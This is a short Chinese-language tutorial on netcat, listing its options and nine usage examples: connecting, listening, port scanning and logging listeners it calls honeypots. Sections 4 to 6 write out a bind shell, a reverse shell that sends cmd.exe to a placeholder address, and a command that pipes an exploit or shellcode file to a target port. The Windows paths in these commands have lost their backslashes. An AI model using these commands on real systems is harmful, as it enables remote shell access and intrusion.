# <h1 align=center>netcat使用</h1>
netcat被誉为网络安全界的“瑞士军刀”，一个简单而有用的工具，透过使用TCP或UDP协议的网络连接去读写数据。它被设计成一个稳定的后门工具，能够直接由其它程序和脚本轻松驱动。<br>
同时，它也是一个功能强大的网络调试和探测工具，能够建立你需要的几乎所有类型的网络连接，还有几个很有意思的内置功能(详情请看下面的使用方法)。<br>
## 参数介绍
nc.exe -h即可看到各参数的使用方法。
```
基本格式：nc [-options] hostname port[s] [ports] ...
nc –l –p port [options] [hostname] [port]
-d 后台模式
-e prog 程序重定向，一旦连接，就执行 [危险!!]
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-h 帮助信息
-i secs 延时的间隔
-l 监听模式，用于入站连接
-L 连接关闭后,仍然继续监听
-n 指定数字的IP地址，不能用hostname
-o file 记录16进制的传输
-p port 本地端口号
-r 随机本地及远程端口
-s addr 本地源地址
-t 使用TELNET交互方式
-u UDP模式
-v 详细输出--用两个-v可得到更详细的内容
-w secs timeout的时间
-z 将输入输出关掉--用于扫描时
端口的表示方法可写为M-N的范围格式。
```

## 用法
大概有以下几种用法：
### 1. 连接到REMOTE主机，例子：
格式：nc -nvv 192.168.x.x 80
讲解：连到192.168.x.x的TCP80端口
### 2. 监听LOCAL主机，例子：
格式：nc -l -p 80
讲解：监听本机的TCP80端口
### 3. 扫描远程主机，例子：
格式：nc -nvv -w2 -z 192.168.x.x 80-445
讲解：扫描192.168.x.x的TCP80到TCP445的所有端口
### 4. REMOTE主机绑定SHELL，例子：
格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe
讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
### 5. REMOTE主机绑定SHELL并反向连接，例子：
格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354
讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
高级用法：
### 6. 作攻击程序用，例子：
格式1：type.exe c:exploit.txt|nc -nvv 192.168.x.x 80
格式2：nc -nvv 192.168.x.x 80 < c:exploit.txt
讲解：连接到192.168.x.x的80端口，并在其管道中发送c:exploit.txt的内容(两种格式确有相同的效果，真是有异曲同工之妙:P)
附：c:exploit.txt为shellcode等
### 7. 作蜜罐用[1]，例子：
格式：nc -L -p 80
讲解：使用-L(注意L是大写)可以不停地监听某一个端口，直到ctrl+c为止。
### 8. 作蜜罐用[2]，例子：
格式：nc -L -p 80 > c:log.txt
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，同时把结果输出到c:log.txt中，如果把‘>’改为‘>>’即可以追加日志。
附：c:log.txt为日志等
### 9. 作蜜罐用[3]，例子：
格式1：nc -L -p 80 < c:honeypot.txt
格式2：type.exe c:honeypot.txt|nc -L -p 80
讲解：使用-L可以不停地监听某一个端口，直到ctrl+c为止，并把c:honeypot.txt的内容‘送’入其管道中。
